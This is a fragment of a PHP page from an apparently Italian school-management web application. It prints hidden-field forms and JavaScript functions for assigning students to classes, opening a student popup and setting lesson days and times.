        print "<TR><TD COLSPAN=3 align='center' height='70'><INPUT TYPE='button' STYLE='width:200px;' VALUE='Ricerca' onClick=fasesearch(document.caricamento);></TD></TR>";
      }*/
      print "</TABLE></FORM>";
    }
  }  
  print "<FORM ACTION='". FILE_DBQUERY ."' METHOD='POST' NAME='modificaclasse'><INPUT TYPE='hidden' NAME='cmd' VALUE='". $cmd['comando'] ."'><INPUT TYPE='hidden' NAME='selobj' VALUE='". $selobj ."'><INPUT TYPE='hidden' NAME='codicepagina' VALUE='". codiceform(FILE_CORRENTE) ."'>";
  print "<INPUT TYPE='hidden' NAME='idstudente' VALUE=''><INPUT TYPE='hidden' NAME='idpstudi' VALUE=''><INPUT TYPE='hidden' NAME='datai' VALUE=''><INPUT TYPE='hidden' NAME='dataf' VALUE=''></FORM>";
  
  include ("finepagina.php");
?>
<SCRIPT>
 function chiamapopup(fase,id) {
    var figlio;
    var width  = 800;
    var height = 550;
    var left   = (screen.width  - width)/2;
    var top    = (screen.height - height)/2;
    var params = 'width='+width+', height='+height;
    params += ', top='+top+', left='+left;
    params += ', directories=no';
    params += ', location=no';
    params += ', menubar=no';
    params += ', resizable=no';
    params += ', scrollbars=yes';
    params += ', status=no';
    params += ', toolbar=no';
    
    figlio = window.open("frm_studenti_popup.php?selobj="+id+"&cmd="+fase,"studenti",params);
    if (figlio.opener==null) {
      figlio.opener=self;
      figlio.frames["saveopener"].opener=self;
    }
  }

function insegna() {
  document.caricamento.cmd.value=<?=FASEASSDOCENTE?>;
  document.caricamento.submit();
}

function modclasse(idstudente, idpstudi, datai, op) {
  document.modificaclasse.idstudente.value=idstudente;
  document.modificaclasse.idpstudi.value=idpstudi;
  if (op==1) {
    document.modificaclasse.cmd.value=<?=FASEADDSTUDENTE?>;
  } else {
    document.modificaclasse.datai.value=datai;
    risp = confirm("<?=_MSGDELSTUDCLASSE_?>");
    if (risp) {
      //ok
      dt = prompt("<?=_MSGDATADELSTUDCLASSE_?>");
      document.modificaclasse.dataf.value=dt;
      document.modificaclasse.cmd.value=<?=FASEFINESTUDENTE?>;
    } else {
      document.modificaclasse.cmd.value=<?=FASEDELSTUDENTE?>;
    }
  }
  document.modificaclasse.submit();
}

function prefdayclick() {
  document.prefday.cmd2.value="2";
  document.prefday.submit();
}
function dtiniclick() {
  document.prefday.submit();
}

function btnsubclick() {
  document.prefday.cmd.value=<?=FASEPREFDAYINS?>;
  document.prefday.action="conflitto.php";
  document.prefday.submit();
}

function impostaorafine() {
  dlezione = <?=$editval['pstudi_dlezione']/30;?>;
  newpos = document.prefday.orai.options.selectedIndex + dlezione;
  if (newpos > document.prefday.oraf.options.length-1) {
    newpos = document.prefday.oraf.options.length-1;
  }
  document.prefday.oraf.options.selectedIndex=newpos;
}



</SCRIPT>

</body>
</html>
